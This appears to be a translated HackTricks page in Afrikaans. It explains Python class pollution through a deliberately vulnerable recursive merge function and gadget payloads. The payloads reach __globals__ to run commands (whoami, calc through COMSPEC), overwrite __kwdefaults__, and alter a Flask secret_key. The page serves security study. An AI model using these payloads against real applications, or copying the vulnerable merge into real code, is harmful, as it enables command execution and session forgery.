# Class Pollution (Python's Prototype Pollution)

## Basiese voorbeeld

Deur `__qualname__` via 'n instansie se klasverwysing te verander, word die klas en sy veranderbare basisklasse opgedateer.<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Basiese Kwesbaarheidsvoorbeeld

'n Rekursiewe samevoeging kan aanvallerbeheerde karteringsleutels aanvaar en geneste waardes deur item- of attribuuttoegang skryf.<sup>[[1]](#references)</sup>
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget-voorbeelde

<details>

<summary>Skep ’n verstekwaarde vir ’n klaseienskap vir RCE (subprocess)</summary>

’n Gedeelde basisklas kan ’n verstekkenmerk verskaf wat deur ’n bevel-gadget in ’n sibling-klas gebruik word.<sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Besmetting van ander klasse en globale veranderlikes deur <code>globals</code></summary>

'n Funksie se `__globals__`-kartering stel die module-naamruimte bloot wat bereikbaar is vanaf 'n metode wat in daardie module gedefinieer is.<sup>[[1]](#references)[[4]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Arbitrêre subprocess-uitvoering</summary>

Op Windows gebruik `Popen(..., shell=True)` die `COMSPEC`-omgewingsveranderlike as die verstek-shell, dus demonstreer hierdie gadget command redirection wat deur die omgewing gesteun word.<sup>[[1]](#references)[[5]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Oorskryf van <strong><code>__kwdefaults__</code></strong></summary>

Python dokumenteer `__kwdefaults__` as die mapping van verstekwaardes vir slegs-sleutelwoord-parameters, wat `*` of `*args` in ’n funksiedefinisie volg.<sup>[[4]](#references)</sup> Die volgende gadget oorskryf daardie mapping deur ’n besoedelde function path.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Oorskryf Flask-geheim oor lêers heen</summary>

As die klas van die besoedelde objek in ’n ander module as die toepassing se toegangspuntmodule is, stel sy metodes se `__globals__` aanvanklik die klasmodule se naamruimte bloot. ’n Deurloop deur die loader en `sys.modules.__main__` kan dan die toegangspuntmodule en sy Flask-`app`-objek bereik.<sup>[[1]](#references)[[2]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Flask gebruik `app.secret_key` om die session cookie te onderteken; kennis van die sleutel laat 'n aanvaller toe om geldige session-data te skep.<sup>[[6]](#references)</sup>

Die oorspronklike writeup demonstreer die volgende pad om `app.secret_key` te bereik; CTFtime huisves ook 'n kopie van die writeup.<sup>[[2]](#references)[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Deur die sleutel te verander, kan dit moontlik wees om vervangende sessiekoekies te onderteken en moontlik privilegie-eskalasie moontlik te maak; sien [die Flask-sessiehulpmiddelbladsy](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>

</details>

Kyk ook na die volgende bladsy vir meer leesalleen-gadgets:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [idekCTF 2022-taakbestuurder writeup (oorspronklik)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - idekCTF 2022: taakbestuurder writeup](https://ctftime.org/writeup/36082)
- [4] [inspect — Inspekteer lewendige objekte](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Subprosesbestuur](https://docs.python.org/3/library/subprocess.html)
- [6] [Quickstart — Flask-dokumentasie](https://flask.palletsprojects.com/en/stable/quickstart/)
{{#include ../../banners/hacktricks-training.md}}
